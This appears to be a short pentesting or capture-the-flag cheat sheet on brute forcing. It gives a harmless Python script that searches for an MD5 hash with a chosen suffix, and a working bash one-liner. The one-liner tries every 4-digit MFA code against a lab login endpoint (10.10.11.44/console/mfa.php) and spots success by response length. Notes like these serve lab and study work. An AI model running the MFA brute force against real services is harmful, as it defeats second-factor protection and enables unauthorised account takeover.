# Bruteforcing

## Find a specific hash

Find a hash that ends with your lucky number:

  #!/usr/bin/env python3
  from hashlib import md5
  from string import ascii_lowercase
  import itertools
  counter=1
  lucky_number='007'
  while True:
    combos=itertools.combinations_with_replacement(ascii_lowercase,r=counter)
    for combo in combos:
      string="".join(combo)
      h=md5(string.encode("utf-8"))
      the_hash=h.hexdigest()
      if the_hash.endswith(lucky_number):
        print(string,the_hash)
        exit()
    counter+=1

## Iterate over pins for MFA codes

Find a 4 digits pin for weak MFA:

  for i in {0000..9999};do echo $i; curl -s -X POST --data "code=$i" 10.10.11.44/console/mfa.php --cookie "user=user_name;pwd=egho"|wc|grep -v "1523"; if [ $? -eq 0 ]; then echo BOOM; break; fi;done
  
